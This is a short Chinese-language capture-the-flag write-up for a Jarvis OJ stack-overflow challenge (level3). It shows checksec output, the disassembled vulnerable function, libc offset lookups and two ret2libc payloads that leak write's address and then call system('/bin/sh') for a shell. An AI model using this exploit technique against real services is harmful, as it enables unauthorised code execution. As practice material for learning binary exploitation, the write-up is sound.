# Description

nc pwn2.jarvisoj.com 9879

# checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000) 
```
开了NX
# analysis

```
.text:0804844B                 public vulnerable_function
.text:0804844B vulnerable_function proc near           ; CODE XREF: main+11p
.text:0804844B
.text:0804844B buf             = byte ptr -88h
.text:0804844B
.text:0804844B                 push    ebp
.text:0804844C                 mov     ebp, esp
.text:0804844E                 sub     esp, 88h
.text:08048454                 sub     esp, 4
.text:08048457                 push    7               ; n
.text:08048459                 push    offset aInput   ; "Input:\n"
.text:0804845E                 push    1               ; fd
.text:08048460                 call    _write
.text:08048465                 add     esp, 10h
.text:08048468                 sub     esp, 4
.text:0804846B                 push    100h            ; nbytes
.text:08048470                 lea     eax, [ebp+buf]
.text:08048476                 push    eax             ; buf
.text:08048477                 push    0               ; fd
.text:08048479                 call    _read
.text:0804847E                 add     esp, 10h
.text:08048481                 nop
.text:08048482                 leave
.text:08048483                 retn
.text:08048483 vulnerable_function endp
```
溢出点其本身没有什么大变化

由于没有给其他的东西，程序小ROP不方便，所以ret2lib、

# exploit

第一步打出got write 地址
栈布置：
0x88 * padding
4 * padding ebp
func:write  addr
ret: write ret addr 继续利用
parameter: 1
parameter: 2
parameter: 3

第二步计算出 system 地址 "/bin/sh" 地址
```
➜  level3 : readelf -a libc-2.19.so | grep "read@"
  950: 000daf60   125 FUNC    WEAK   DEFAULT   12 read@@GLIBC_2.0

➜  level3 : readelf -a libc-2.19.so | grep "system@"
 1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
```

```
➜  level3 : strings -a -t x ./libc-2.19.so | grep "/bin/sh"
 16084c /bin/sh
```

第三步: 二次溢出获得shell

0x88 * padding + 4 * padding + func_system + 4 * padding + shell_addr

# payload
```
   payload1 = 0x88 * "A" + 4 * "A" + p32(write_plt) + p32(write_ret)+p32(write_parameter_1)+p32(write_parameter_2)+p32(write_parameter_3)
   //calcualte
   payload2 = 0x88 * "A" + 4 * "A" + p32(func_system) + 4*"A" + p32(shell_addr)
```

对于我来说 这是一次挑战!